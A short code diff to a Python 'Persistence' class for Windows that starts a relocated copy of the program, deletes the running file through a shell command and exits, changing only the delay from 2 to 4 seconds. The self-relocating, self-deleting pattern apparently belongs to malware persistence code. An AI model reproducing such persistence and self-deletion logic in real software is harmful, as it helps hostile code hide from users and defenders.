@@ -89,5 +89,5 @@ class Windows(Persistence):
                 return
 
             os.startfile(new_file)
-            subprocess.Popen(f"timeout 2 & del -f {curr_file}", shell=True)
+            subprocess.Popen(f"timeout 4 & del -f {curr_file}", shell=True)
             sys.exit(0)
